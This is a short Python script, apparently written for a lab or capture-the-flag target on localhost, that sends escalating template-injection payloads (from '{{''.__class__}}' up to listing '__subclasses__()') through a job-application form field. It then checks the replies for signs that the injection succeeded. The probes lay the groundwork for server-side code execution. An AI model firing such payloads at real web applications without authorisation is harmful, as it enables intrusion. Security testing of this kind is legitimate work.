import requests
import re

session = requests.Session()
base_url = "http://127.0.0.1:32856"

# Establish session first
init_response = session.get(f"{base_url}/application")
print(f"Session established - Status: {init_response.status_code}\n")

# Define SSTI payloads to test progressively
payloads = [
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1]}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}"
]

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}/4] Payload: {payload}")
    
    data = {
        "name": payload,
        "email": "test@example.com",
        "phone": "1234567890",
        "experience": "5",
        "license": "ABC123"
    }
    
    response = session.post(f"{base_url}/submit", data=data)
    
    print(f"Status: {response.status_code} | Length: {len(response.text)}B")
    
    # Extract key parts of response
    thank_you_match = re.search(r'Thank you[^<.!]*[.!]', response.text, re.IGNORECASE)
    if thank_you_match:
        print(f"Message: {thank_you_match.group()}")
    
    # Check for SSTI execution indicators
    if "<class 'str'>" in response.text:
        print("[!] SSTI CONFIRMED - <class 'str'> detected!")
    elif "<class 'object'>" in response.text:
        print("[!] SSTI CONFIRMED - <class 'object'> detected!")
    elif "class 'type'" in response.text or "<class" in response.text:
        print("[!] SSTI CONFIRMED - Class objects in response!")
    
    # Look for subclasses list
    if "subprocess" in response.text.lower() or "builtin" in response.text.lower():
        print("[!] SSTI CONFIRMED - Subclasses list exposed!")
    
    # Print portion of response containing evaluation result
    if "Thank you" in response.text:
        # Extract 200 chars around "Thank you"
        idx = response.text.find("Thank you")
        snippet = response.text[idx:idx+300]
        print(f"Response snippet: {snippet[:250]}...")

print("\n[*] Testing complete")

